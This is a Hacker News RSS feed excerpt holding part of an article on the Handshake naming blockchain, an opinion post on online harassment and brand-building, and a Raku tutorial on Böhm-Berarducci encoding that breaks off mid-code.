<p>Let√¢‚Ç¨‚Ñ¢s consider the inherent complexity of an internet-scale naming system. For reference, the naming layer (DNS), unlike the other layers of the internet stack, is the only layer that is a system and not a protocol - the key difference between the two is that a protocol cannot enforce uniqueness of names, which is essential to a functioning namespace. It√¢‚Ç¨‚Ñ¢s also arguably by far the most complex layer with many competing technical, political, and economical demands.</p>

<p>As a standalone blockchain, Handshake has room to grow all on its own and govern itself without interfering with other projects or having to compete with different priorities with other use cases (like gaming or DeFi) trying to run in parallel on the same network. In addition, there are several fundamental constraints in other blockchains - for example, Bitcoin limited OP sizes and Ethereum√¢‚Ç¨‚Ñ¢s notoriously hard to sync blockchain.</p>

<p>If Handshake is built on another blockchain, the instability caused by these competing priorities for use cases and political interests also eliminates one of the core requirements for a decentralized naming infrastructure - which is stability. A naming infrastructure needs to be highly stable - remember - both users, hosts and developers need to be confident that the names will be around for a long time in the same format. For instance, Ethereum√¢‚Ç¨‚Ñ¢s sky high gas prices due to DeFi and the complex migration to ETH2 are both creating high levels of certainty around how apps will work in the future, and whether retail users will be able to have the same level of access as large ticket users.</p>

<p>Lastly, creating a native auction system is complicated and requires highly specific primitives, such as making coins unspendable for certain periods, and increases the complexity of the system if HNS is a non-native token.</p>

<h3 id="2-decentralization">2. Decentralization</h3>

<p>The other critical consideration is decentralization. <em>Remember, the goal here is to achieve a truly decentralized, uncensorable namespace independent of centralized control and policies. Anything less than will be completely redundant.</em></p>

<p>Ethereum is the most decentralized smart contract platform of date, but it√¢‚Ç¨‚Ñ¢s still insufficient as a base layer blockchain for a truly decentralized naming system. A system based on Ethereum either would have to be strictly immutable or engineer a governance mechanism with a single or multiple signers. For example, the ENS system on Ethereum has a 7-part multisig making it either censorable and shutting it off to any future innovations or upgrades. These mechanisms either risk shutting off future innovations or don√¢‚Ç¨‚Ñ¢t meet the decentralized requirement.</p>

<p>How about sidechains? Sidechains mostly rely on the main chain√¢‚Ç¨‚Ñ¢s security, which makes them completely subject to the same concerns above in terms of sharing priorities with the main chain. In addition, there is currently no such thing as a decentralized side-chain on Bitcoin. Counterparty is a one-way system, Liquid requires a small federated multisig, and Rootstock is currently federated waiting on Drivechain support from Bitcoin.</p>

<p>For all of PoW√¢‚Ç¨‚Ñ¢s issues, namely with the limited number of miners, it is built on competition which is inherently decentralized as well as clear separation of concerns between developers, users, and miners. This is in contrast to PoS which encourages stakeholders to collude and centralize, creating a largely plutocratic environment.</p>

<p>As such, true naming decentralization with the ability to upgrade is likely best achieved on a standalone PoW chain with robust hash power, a strong ecosystem, and miner confidence in the value of the blockchain.</p>

<h3 id="3-ease-of-trustless-resolution">3. Ease of Trustless Resolution</h3>

<p>Compared to other naming blockchains, _the entire Handshake stack is engineered for the use case of creating a human readable, truly decentralized, fully accessible and secure namespace. _</p>

<p>The naming data in Handshake is stored in a novel data structure called an Urkel Tree,  which was designed specifically for this purpose. The proofs are small and verify quickly, allowing name resolution to happen with very little computation.</p>

<p>Secondly, a highly unique application called HNSD written in C only handles the DNS functions of Handshake (avoiding ‚Ä¶</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://meowis.ms/handshake.html">https://meowis.ms/handshake.html</a></em></p>]]>
            </description>
            <link>https://meowis.ms/handshake.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579284</guid>
            <pubDate>Thu, 24 Sep 2020 15:05:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Twitter mob is good for business]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579258">thread link</a>) | @Reedx
<br/>
September 24, 2020 | https://www.rocanews.com/blog-posts/the-twitter-mob-is-good-for-business | <a href="https://web.archive.org/web/*/https://www.rocanews.com/blog-posts/the-twitter-mob-is-good-for-business">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>After Ruth Bader Ginsburg died, Reza Aslan, the famous broadcast commentator and scholar of religion, published a tweet <a href="https://twitter.com/rezaaslan/status/1307107507131875330" target="_blank">which read</a>, ‚ÄúIf they even TRY to replace RBG we burn the entire fucking thing down.‚Äù<br></p><p>This was stupid, but it was also savvy.<br></p><p>Before I explain, a bit of disclosure: I have no beef with Aslan, <a href="https://www.thecut.com/2014/10/reza-aslan-on-what-the-new-atheists-get-wrong.html" target="_blank">published an enjoyable interview with him in 2014</a>, and <a href="https://twitter.com/jessesingal/status/873752684456706048" target="_blank">thought</a> (and continue to think) he got a raw deal when CNN let him go for <a href="https://money.cnn.com/2017/06/09/media/cnn-reza-aslan-decision/index.html">‚Äúprofane anti-Trump tweets.‚Äù</a><br></p><p>But Aslan‚Äôs tweet and its aftermath highlight a pretty ridiculous reality of online life these days, which is that big names on Twitter and other platforms regularly seek out harassment in the most obvious ways, and then, when said harassment (inevitably) arrives, attempt to leverage it to boost their brand and gain attention.</p><p>Aslan‚Äôs tweet was met with fury, because of course it was ‚Äî it sounded like he was saying liberals should burn down the entire country over the RBG seat. Aslan was firehosed with a bunch of negative reactions on Twitter and elsewhere, and eventually that fury led to an article in <em>American Greatness</em>, a right-wing outlet, headlined <a href="https://amgreatness.com/2020/09/20/the-loathsomeness-of-reza-aslan/" target="_blank">‚ÄúThe Loathsomeness of Reza Aslan,‚Äù</a> as well as a Breitbart story whose headline contained the overheated claim that Aslan‚Äôs tweet constituted a <a href="https://www.breitbart.com/2020-election/2020/09/18/blue-checks-vow-violence-if-mcconnell-tries-to-replace-ruth-bader-ginsburg-burn-the-entire-fking-thing-down/" target="_blank">‚Äúvow [of] violence.‚Äù</a></p></div><div><p>Aslan, of course, replied with a <a href="https://twitter.com/rezaaslan/status/1308165311330304000" target="_blank">tweet linking to the American Greatness story</a> that read, ‚ÄúI love this, especially when I think about the fact that Trump‚Äôs followers have been encouraged by him to literally murder people. But yeah, Ok.‚Äù Earlier that day, he also <a href="https://twitter.com/rezaaslan/status/1308056797110915073" target="_blank">tweeted</a>, ‚ÄúBeen a few days since I tweeted that if GOP try to jam a SCOTUS thru B4 election we burn the fucking thing down &amp; since the death threats &amp; Breitbart headlines about my tweet have now stopped let me just say that if GOP try to jam SCOTUS through we burn the fucking thing down.‚Äù</p><p>To anyone who understands how the internet works, it shouldn‚Äôt come as a surprise that Aslan received death threats and, in all likelihood, all sorts of other abuse. This is horrific behavior, and anyone who sends a death threat to anyone should get a visit from the cops.</p><p>But it is also clear that Aslan is doing everything in his power to keep the online conflagration burning ‚Äî he is quite directly feeding it fuel. This is a behavior I‚Äôve noticed over and over among certain types on Twitter, who complain about harassment even as they do seemingly everything to maximize the probability of antagonizing as many people as possible, leading to yet more harassment.</p><p>For some people, this is chronic behavior that almost comes across as an addiction. I‚Äôm not trying to start fights, so I‚Äôll leave names out of this, but there are certain feminist writers who will tweet, endlessly and obsessively, about the supposed evils of ‚ÄúBernieBros.‚Äù Just over and over and over, long after the point has been made repeatedly. Bernie Twitter, like every other subculture, does have a subset of unhinged people who are unable to resist rising to bait ‚Äî plus, there are always trollish third parties like 4chan who seek out internet drama to stoke ‚Äî so inevitably, if someone talks smack about Sanders over and over and over, they will be the targetof harassment. That harassment, in turn, proves just how evil Bernie supporters are. And on and on the cycle goes, making everyone dumber and more cynical.</p><p>All this stuff is very performative, very geared toward online brand-boosting, and makes it harder to take online harassment ‚Äî which in its <a href="https://nymag.com/intelligencer/2015/09/victim-of-a-scary-web-shaming-speaks-out.html" target="_blank">most serious forms really can be terrifying </a>‚Äî seriously. Being the victim of online harassment absolutely confers status and attention. That doesn‚Äôt mean anyone <em>deserves </em>it, of course, or that it‚Äôs fun to have death threats in your inbox.&nbsp;</p><p>But it does feel like there‚Äôs a willful inability to understand that if you yell out provocative stuff in a public space over and over, and do everything you can to draw attention to yourself and your controversial views in insulting ways, there‚Äôs very little that anyone can do to prevent a small (proportionally speaking) subset of people from responding with disproportionate ire ‚Äî sometimes of the abusive variety.<br></p></div></div>]]>
            </description>
            <link>https://www.rocanews.com/blog-posts/the-twitter-mob-is-good-for-business</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579258</guid>
            <pubDate>Thu, 24 Sep 2020 15:02:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A universal interpreter ‚Äì Wim Vanderbauwhede]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579253">thread link</a>) | @lizmat
<br/>
September 24, 2020 | https://wimvanderbauwhede.github.io/articles/universal-interpreter-part-2/ | <a href="https://web.archive.org/web/*/https://wimvanderbauwhede.github.io/articles/universal-interpreter-part-2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content" itemprop="articleBody">
				<p>In <a href="https://wimvanderbauwhede.github.io/articles/universal-interpreter-part-1">the previous article</a> I explained the basic idea behind a technique called <a href="http://okmij.org/ftp/tagless-final/course/Boehm-Berarducci.html">B√∂hm-Berarducci encoding</a> of algebraic data types, and showed a way to implement this technique in <a href="https://raku.org/">Raku</a>. Unless you are already familiar with this formalism, I recommend you read that article first. </p>

<p>In this article I want to illustrate how the B√∂hm-Berarducci (BB) encoding of a data structure based on algebraic data types can be considered as a universal interpreter. What this means is that it is easy to perform computations that turn the data structure into something else. As an example, I will demonstrate how to create an evaluator and pretty-printer for a parsed polynomial expression.</p>

<h2>A parse tree type</h2>

<p>Consider expressions of the form <code>a*x^2+b*x+c</code> or <code>x^3+1</code> or <code>x*y^2-x^2*y</code>. Let's assume we have a parser for such an expression, for example built using <a href="https://wimvanderbauwhede.github.io/articles/list-based-parser-combinators/">parser combinators</a>. Let's also assume that this parser returns the parsed data as an algebraic data type, defined in Haskell as:</p>
<div><pre><code data-lang="haskell"><span></span><span>data</span> <span>Term</span> <span>=</span> 
      <span>Var</span> <span>String</span>
    <span>|</span> <span>Par</span> <span>String</span> 
    <span>|</span> <span>Const</span> <span>Int</span>
    <span>|</span> <span>Pow</span> <span>Term</span> <span>Int</span>
    <span>|</span> <span>Add</span> <span>[</span><span>Term</span><span>]</span>
    <span>|</span> <span>Mult</span> <span>[</span><span>Term</span><span>]</span>
</code></pre></div>
<p>and in Raku:</p>
<div><pre><code data-lang="perl6"><span></span><span>role</span> <span>Term</span> {}
<span>role</span> <span>Var</span> [<span>Str</span> \<span>v</span>] <span>does</span> <span>Term</span> {
    <span>has</span> <span>Str</span> <span>$.var</span> = <span>v</span>;
}
<span>role</span> <span>Par</span> [<span>Str</span> \<span>p</span>] <span>does</span> <span>Term</span> {
    <span>has</span> <span>Str</span> <span>$.par</span> = <span>p</span>;
}
<span>role</span> <span>Const</span> [<span>Int</span> \<span>c</span>] <span>does</span> <span>Term</span> {
    <span>has</span> <span>Int</span> <span>$.const</span> = <span>c</span>;
}
<span>role</span> <span>Pow</span> [<span>Term</span> \<span>t</span>, <span>Int</span> \<span>n</span>] <span>does</span> <span>Term</span> {
    <span>has</span> <span>Term</span> <span>$.term</span> = <span>t</span>;
    <span>has</span> <span>Int</span> <span>$.exp</span> = <span>n</span>;
}
<span>role</span> <span>Add</span> [<span>Array</span>[<span>Term</span>] \<span>ts</span>] <span>does</span> <span>Term</span> {
    <span>has</span> <span>Array</span>[<span>Term</span>] <span>$.terms</span> = <span>ts</span>;
}
<span>role</span> <span>Mult</span> [<span>Array</span>[<span>Term</span>] \<span>ts</span>] <span>does</span> <span>Term</span> {
    <span>has</span> <span>Array</span>[<span>Term</span>] <span>$.terms</span> = <span>ts</span>;
}
</code></pre></div>
<p>The additional complexity compared to the types discussed in <a href="https://wimvanderbauwhede.github.io/articles/universal-interpreter-part-1">the previous article</a> is that this type is recursive: the <code>Pow</code>, <code>Add</code> and <code>Mult</code> roles take parameters of type <code>Term</code>. </p>

<p>Before we look at the BB encoding, let's first write a pretty-printer for this type, using recursive <code>multi sub</code>s. </p>
<div><pre><code data-lang="perl6"><span></span><span># Pretty-print a Term </span>
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Var</span> \<span>t</span>) { <span>t</span>.<span>var</span> }
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Par</span> \<span>c</span>) { <span>c</span>.<span>par</span> }
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Const</span> \<span>n</span>) { <span>"{n.const}"</span> }
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Pow</span> \<span>pw</span>){ 
    <span>ppTerm</span>(<span>pw</span>.<span>term</span>) ~ <span>'^'</span> ~ <span>"{pw.exp}"</span> 
}
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Add</span> \<span>t</span>) { 
    <span>my</span> <span>@pts</span> = <span>map</span> {<span>ppTerm</span>(<span>$_</span>)}, |<span>t</span>.<span>terms</span>;
    <span>"("</span>~<span>join</span>( <span>" + "</span>, <span>@pts</span>)~<span>")"</span>
}
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Mult</span> \<span>t</span>){ 
    <span>my</span> <span>@pts</span> = <span>map</span> {<span>ppTerm</span>(<span>$_</span>)}, |<span>t</span>.<span>terms</span>;
    <span>join</span>( <span>" * "</span>, <span>@pts</span>)
}
</code></pre></div>
<p>In the same way we can write an evaluator for this type:</p>
<div><pre><code data-lang="perl6"><span></span><span># Evaluate a Term </span>
<span>multi</span> <span>sub</span> <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>, <span>Var</span> \<span>t</span>) { <span>%vars</span>{<span>t</span>.<span>var</span>} }
<span>multi</span> <span>sub</span> <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>Par</span> \<span>c</span>) { <span>%pars</span>{<span>c</span>.<span>par</span>} }
<span>multi</span> <span>sub</span> <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>Const</span> \<span>n</span>) { <span>n</span>.<span>const</span> }
<span>multi</span> <span>sub</span> <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>Pow</span> \<span>pw</span>){ 
    <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>pw</span>.<span>term</span>) ** <span>pw</span>.<span>exp</span> 
}
<span>multi</span> <span>sub</span> <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>Add</span> \<span>t</span>) { 
    <span>my</span> <span>@pts</span> = <span>map</span> {<span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>$_</span>)}, |<span>t</span>.<span>terms</span>;
    [+] <span>@pts</span>
}
<span>multi</span> <span>sub</span> <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>Mult</span> \<span>t</span>){ 
    <span>my</span> <span>@pts</span> = <span>map</span> {<span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>$_</span>)}, |<span>t</span>.<span>terms</span>;
    [*] <span>@pts</span>
}
</code></pre></div>
<h3>Example parse trees</h3>

<p>As an example, let's create the parse tree for a few expressions using the <code>Term</code> type.</p>
<div><pre><code data-lang="perl6"><span></span><span># a*x^2 + b*x + x</span>
<span>my</span> \<span>qterm1</span> = <span>Add</span>[ 
    <span>Array</span>[<span>Term</span>].<span>new</span>(
    <span>Mult</span>[ <span>Array</span>[<span>Term</span>].<span>new</span>(
        <span>Par</span>[ <span>"a"</span>].<span>new</span>, 
        <span>Pow</span>[ <span>Var</span>[ <span>"x"</span>].<span>new</span>, <span>2</span>].<span>new</span>) 
        ].<span>new</span>,
    <span>Mult</span>[
        <span>Array</span>[<span>Term</span>].<span>new</span>(
            <span>Par</span>[ <span>"b"</span>].<span>new</span>, 
            <span>Var</span>[ <span>"x"</span>].<span>new</span>) 
        ].<span>new</span>,
    <span>Par</span>[ <span>"c"</span>].<span>new</span>
    )
    ].<span>new</span>;

<span>#   x^3 + 1    </span>
<span>my</span> \<span>qterm2</span> = <span>Add</span>[ 
    <span>Array</span>[<span>Term</span>].<span>new</span>(
        <span>Pow</span>[ <span>Var</span>[ <span>"x"</span>].<span>new</span>, <span>3</span>].<span>new</span>, 
        <span>Const</span>[ <span>1</span>].<span>new</span>
    )
    ].<span>new</span>;

<span>#   qterm1 * qterm2    </span>
<span>my</span> \<span>qterm</span> = <span>Mult</span>[ 
    <span>Array</span>[<span>Term</span>].<span>new</span>(
        <span>qterm1</span>, <span>qterm2</span>
    )
    ].<span>new</span>;
</code></pre></div>
<p>Calling the pretty-printer and evaluator on this term: </p>
<div><pre><code data-lang="perl6"><span></span><span>say</span> <span>ppTerm</span>( <span>qterm</span>); <span># =&gt; (a * x^2 + b * x + c) * (x^3 + 1)</span>

<span>say</span> <span>evalTerm</span>(
    {<span>"x"</span> =&gt; <span>2</span>}, {<span>"a"</span> =&gt;<span>2</span>,<span>"b"</span>=&gt;<span>3</span>,<span>"c"</span>=&gt;<span>4</span>},  <span>qterm</span>
); <span># =&gt; 162</span>
</code></pre></div>
<h2>BB encoding of the parse tree type</h2>

<p>The BB encoding of the <code>Term</code> algebraic data type in Raku is pleasingly compact:</p>
<div><pre><code data-lang="perl6"><span></span><span>role</span> <span>TermBB</span>[<span>&amp;f</span>] {
    <span>method</span> <span>unTermBB</span>(
        <span>&amp;var:</span>(<span>Str</span> --&gt; <span>Any</span>),
        <span>&amp;par:</span>(<span>Str</span> --&gt; <span>Any</span>),
        <span>&amp;const:</span>(<span>Int</span> --&gt; <span>Any</span>),
        <span>&amp;pow:</span>(<span>Any</span>,<span>Int</span> --&gt; <span>Any</span>),
        <span>&amp;add:</span>(<span>Array</span>[<span>Any</span>] --&gt; <span>Any</span>),
        <span>&amp;mult:</span>(<span>Array</span>[<span>Any</span>] --&gt; <span>Any</span>) 
        --&gt; <span>Any</span>
    ) {
        <span>f</span>(<span>&amp;var</span>,<span>&amp;par</span>,<span>&amp;const</span>,<span>&amp;pow</span>,<span>&amp;add</span>,<span>&amp;mult</span>);
    }
}
</code></pre></div>
<p>It would of course be even more compact without the signatures, but then we'd have no information about the encoded type.</p>

<p>We could of course use this type directly, but instead I want to look at how we can convert between <code>Term</code> and <code>TermBB</code>. </p>

<p>As before, we create our little helpers. Each of the functions below is a constructor which generates the <code>TermBB</code> instance for the corresponding alternative in the <code>Term</code> algebraic data type. (When Raku's macro language is more developed, we will be able to generate these automatically.)</p>
<div><pre><code data-lang="perl6"><span></span><span>sub</span> <span>VarBB</span>(<span>Str</span> \<span>s</span> --&gt; <span>TermBB</span>) { 
    <span>TermBB</span>[ 
        <span>sub</span> (\<span>v</span>, \<span>c</span>, \<span>n</span>, \<span>p</span>, \<span>a</span>, \<span>m) { v.(s)</span> }
    ].<span>new</span>;
    }
<span>sub</span> <span>ParBB</span>(<span>Str</span> \<span>s</span> --&gt; <span>TermBB</span>) { 
    <span>TermBB</span>[ 
        <span>sub</span> (\<span>v</span>, \<span>c</span>, \<span>n</span>, \<span>p</span>, \<span>a</span>, \<span>m) { c.(s)</span> }
    ].<span>new</span>;
    }
<span>sub</span> <span>ConstBB</span>(<span>Int</span> \<span>i</span> --&gt; <span>TermBB</span>) { 
    <span>TermBB</span>[ 
        <span>sub</span> (\<span>v</span>, \<span>c</span>, \<span>n</span>, \<span>p</span>, \<span>a</span>, \<span>m) { n.(i)</span> }
    ].<span>new</span>;
    }    
<span>sub</span> <span>PowBB</span>( <span>TermBB</span> \<span>t</span>, <span>Int</span> \<span>i</span> --&gt; <span>TermBB</span>) {
    <span>TermBB</span>[  <span>sub</span> (\<span>v</span>, \<span>c</span>, \<span>n</span>, \<span>p</span>, \<span>a</span>, \<span>m) { </span>
<span>        p.( t.unTermBB( v, c, n, p, a, m )</span>, <span>i</span>);
    }
    ].<span>new</span>;
}
<span>sub</span> <span>AddB</span>( <span>Array</span>[<span>TermBB</span>] \<span>ts</span> --&gt; <span>TermBB</span>) {
    <span>TermBB</span>[  <span>sub</span> (\<span>v</span>, \<span>c</span>, \<span>n</span>, \<span>p</span>, \<span>a</span>, \<span>m) { </span>
<span>        a.( map {.unTermBB( v, c, n, p, a, m )</span>}, <span>ts</span> )
    }
    ].<span>new</span>;
}
<span>sub</span> <span>MultBB</span>(  <span>Array</span>[<span>TermBB</span>] \<span>ts</span> --&gt; <span>TermBB</span>) { 
    <span>TermBB</span>[  <span>sub</span> (\<span>v</span>, \<span>c</span>, \<span>n</span>, \<span>p</span>, \<span>a</span>, \<span>m) { </span>
<span>        m.( map {.unTermBB( v, c, n, p, a, m )</span>}, <span>ts</span> )
    }
    ].<span>new</span>;
}
</code></pre></div>
<p>The interesting generators are <code>PowBB</code>, <code>AddBB</code> and <code>MultBB</code> because they are recursive. In <code>PowBB</code>, the function passed as parameter to the <code>TermBB</code> role constructor calls <code>p</code> which has a signature of <code>:(Any,Int --&gt; Any)</code>, but actually requires an argument of the same type as the return value (we need <code>a -&gt; Int -&gt; a</code>). The argument <code>t</code>  is of type <code>TermBB</code> which is a wrapper around a function which, when applied, will return the right type. In the Raku implementation, this function is the method <code>unTermBB</code>. So we need to call <code>t.unTermBB( ... )</code>.
In <code>AddBB</code> and <code>MultBB</code>, we have an <code>Array[TermBB]</code> so we need to call <code>unTermBB</code> on every element, hence the <code>map</code> call.</p>

<p>Using these generators we can write a single function to convert the algebraic data type into its BB encoding. Unsurprisingly, it is very similar to the pretty-printer and evaluator we wrote for <code>Term</code> instances:</p>
<div><pre><code data-lang="perl6"><span></span><span># Turn a Term into a BB Term</span>
<span>multi</span> <span>sub</span> <span>termToBB</span>(<span>Var</span> \<span>t</span>  ) { <span>VarBB</span>(<span>t</span>.<span>var</span>)}
<span>multi</span> <span>sub</span> <span>termToBB</span>(<span>Par</span> \<span>c</span>  ) { <span>ParBB</span>( <span>c</span>.<span>par</span>)}
<span>multi</span> <span>sub</span> <span>termToBB</span>(<span>Const</span> \<span>n</span>) {<span>ConstBB</span>(<span>n</span>.<span>const</span>)}
<span>multi</span> <span>sub</span> <span>termToBB</span>(<span>Pow</span> \<span>pw</span> ) { 
    <span>PowBB</span>( <span>termToBB</span>(<span>pw</span>.<span>term</span>), <span>pw</span>.<span>exp</span>)
}
<span>multi</span> <span>sub</span> <span>termToBB</span>(<span>Add</span> \<span>t</span>  ) { 
    <span>AddBB</span>( <span>typed-map</span>( <span>TermBB</span>, <span>t</span>.<span>terms</span>, <span>&amp;termToBB</span> ))
}
<span>multi</span> <span>sub</span> <span>termToBB</span>(<span>Mult</span> \<span>t</span> ) { 
    <span>MultBB</span>( <span>typed-map</span>( <span>TermBB</span>, <span>t</span>.<span>terms</span>, <span>&amp;termToBB</span> ))
}

<span># map &amp;f and return in an Array of type T</span>
<span>sub</span> <span>typed-map</span> (\<span>T</span>,\<span>lst</span>,<span>&amp;f</span>) {
    <span>Array</span>[<span>T</span>].<span>new</span>(<span>map</span> {<span>f</span>(<span>$_</span>) }, |<span>lst</span> )
}
</code></pre></div>
<p>Because <code>PowBB</code>, <code>AddBB</code> and <code>MultBB</code> require a <code>TermBB</code>, we need to call <code>termToBB</code> on the <code>Term</code> fields. And because  <code>AddBB</code> and <code>MultBB</code> take an array of <code>Term</code>,  we need a <code>map</code>. However, Raku's <code>map</code> returns values of type <code>Seq</code>, so we need an explicit conversion into <code>Array</code>.</p>

<p>We can now convert any data structure of type <code>Term</code> into its BB encoding:</p>
<div><pre><code data-lang="perl6"><span></span><span>my</span> \<span>qtermbb</span> = <span>termToBB</span>( <span>qterm</span>);

<span>say</span> <span>qtermbb</span>.<span>raku</span>; <span># =&gt; TermBB[Sub].new</span>
</code></pre></div>
<h3>Interpreter 1: Pretty-printer with BB encoding</h3>

<p>To create a pretty-printer for the BB-encoded type, we write implementations for each alternative, and the <code>unTermBB</code> call magically combines these.</p>
<div><pre><code data-lang="perl6"><span></span><span>sub</span> <span>ppTermBB</span>(<span>TermBB</span> \<span>t</span> --&gt; <span>Str</span>){ 
    <span>sub</span> <span>var</span>( \<span>x</span> ) { <span>x</span> }
    <span>sub</span> <span>par</span>( \<span>x</span> ) { <span>x</span> }
    <span>sub</span> <span>const</span>(\<span>x</span> ) { <span>"{x}"</span> }
    <span>sub</span> <span>pow</span>( \<span>t</span>, \<span>m ) { t ~ "^{m}" } </span>
<span>    sub add( \ts )</span> { <span>"("</span>~<span>join</span>( <span>" + "</span>, <span>ts</span>)~<span>")"</span> }
    <span>sub</span> <span>mult</span>( \<span>ts</span> ) { <span>join</span>( <span>" * "</span>, <span>ts</span>) }
    <span>t</span>.<span>unTermBB</span>( <span>&amp;var</span>, <span>&amp;par</span>, <span>&amp;const</span>, <span>&amp;pow</span>, <span>&amp;add</span>, <span>&amp;mult</span>);
}
</code></pre></div>
<p>Compared with <code>ppTerm</code> (copied below for convenience), the main differences are that there is no recursion and no need to <code>map</code> anything. We also don't need a <code>multi sub</code> to pattern match on the constructors, and there is no need to unpack the values stored in the type using attribute accessors. As a result, the BB version is markedly less cluttered.</p>
<div><pre><code data-lang="perl6"><span></span><span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Var</span> \<span>t</span> --&gt; <span>Str</span>) { <span>t</span>.<span>var</span> }
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Par</span> \<span>c</span> --&gt; <span>Str</span>) { <span>c</span>.<span>par</span> }
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Const</span> \<span>n</span> --&gt; <span>Str</span>) { <span>"{n.const}"</span> }
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Pow</span> \<span>pw</span> --&gt; <span>Str</span>){ 
    <span>ppTerm</span>(<span>pw</span>.<span>term</span>) ~ <span>'^'</span> ~ <span>"{pw.exp}"</span> 
}
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Add</span> \<span>t</span> --&gt; <span>Str</span>) { 
    <span>my</span> <span>@pts</span> = <span>map</span> {<span>ppTerm</span>(<span>$_</span>)}, |<span>t</span>.<span>terms</span>;
    <span>"("</span>~<span>join</span>( <span>" + "</span>, <span>@pts</span>)~<span>")"</span>
}
<span>multi</span> <span>sub</span> <span>ppTerm</span>(<span>Mult</span> \<span>t</span> --&gt; <span>Str</span>){ 
    <span>my</span> <span>@pts</span> = <span>map</span> {<span>ppTerm</span>(<span>$_</span>)}, |<span>t</span>.<span>terms</span>;
    <span>join</span>( <span>" * "</span>, <span>@pts</span>)
}
</code></pre></div>
<h3>Interpreter 2: Evaluator with BB encoding</h3>

<p>And an evaluator is equally simple:</p>
<div><pre><code data-lang="perl6"><span></span><span>sub</span> <span>evalTermBB</span>( <span>%vars</span>,  <span>%pars</span>, \<span>t</span>) {
    <span>t</span>.<span>unTermBB</span>( 
        -&gt; \<span>x</span> { <span>%vars</span>{<span>x</span>} }, 
        -&gt; \<span>x</span> { <span>%pars</span>{<span>x</span>} },
        -&gt; \<span>x</span> {<span>x</span>},
        -&gt; \<span>t</span>,\<span>m { t ** m}</span>,
        -&gt; \<span>ts</span> { [+] <span>ts</span>},
        -&gt; \<span>ts</span> { [*] <span>ts</span>}
    );
}
</code></pre></div>
<p>As with <code>evalTerm</code> below, we pass hashes for variable and parameter definitions as arguments to provide context for the evaluation. In the BB version we need to do this only once, rather than for every multi variant, so I have written it below using a <code>given/when</code>. Even then, the BB version is a lot cleaner, for the same reasons as above. </p>
<div><pre><code data-lang="perl6"><span></span><span>sub</span> <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>, <span>Term</span> \<span>t</span>) {
    <span>given</span> <span>t</span> {
        <span>when</span> <span>Var</span> { <span>%vars</span>{<span>t</span>.<span>var</span>} }
        <span>when</span> <span>Par</span> { <span>%pars</span>{<span>t</span>.<span>par</span>} }
        <span>when</span> <span>Const</span> { <span>t</span>.<span>const</span> }
        <span>when</span> <span>Pow</span> { <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>t</span>.<span>term</span>) ** <span>t</span>.<span>exp</span> }
        <span>when</span> <span>Add</span> {
            <span>my</span> <span>@pts</span> = <span>map</span> {
                <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>$_</span>)
                }, |<span>t</span>.<span>terms</span>;
            [+] <span>@pts</span>
        }
        <span>when</span> <span>Mult</span> { 
            <span>my</span> <span>@pts</span> = <span>map</span> {
                <span>evalTerm</span>(<span>%vars</span>,  <span>%pars</span>,<span>$_</span>)
                }, |<span>t</span>.<span>terms</span>;
            [*] <span>@pts</span>
        }
    }
}
</code></pre></div>
<!-- ### Interpreter 3: Pretty-printer and evaluator combined

Now we can do one better and combine these two interpreters.

```perl6
sub evalAndppTermBB(%vars,  %pars, TermBB \t ){ 
    t.unTermBB( 
        -> \x {[%vars{x},x]}, 
        -> \x {[%pars{x},x]},
        -> \x {[x,"{x}"]},
        -> \t,\m {[t[0] ** m, t[1] ~ "^{m}"] },
        -> \ts { 
            my \p = 
                reduce { [ $^a[0] + $^b[0], $^a[1] ~ " + " ~ $^b[1]] }, ts[0],  |ts[1..*];
            [ p[0], "("~p[1]~")" ]; 
        }, 
        -> \ts { 
            reduce { [ $^a[0] * $^b[0], $^a[1] ~ " * " ~ $^b[1]] }, ts[0],  |ts[1..*]
        }
    )
}

say ppTermBB( qtermbb);
say evalTermBB(
    {"x" => 2}, {"a" =>2,"b"=>3,"c"=>4},  qtermbb
);
say evalAndppTermBB(
    {"x" => 2}, {"a" =>2,"b"=>3,"c"=>4},  qtermbb
);
``` -->

<h3>Interpreter 3: Converting <code>TermBB</code> to <code>Term</code></h3>

<p>Finally, let's look at converting <code>TermBB</code> to <code>Term</code>. This is yet another type of interpreter so we can follow exactly the same approach as before: </p>
<div><pre><code data-lang="perl6"><span></span><span>sub</span> <span>toTerm</span>(<span>TermBB</span> \<span>t</span> --&gt; <span>Term</span>){ 
        <span>sub</span> <span>var</span>( \<span>x</span> ) { <span>Var</span>[<span>x</span>].<span>new</span> }
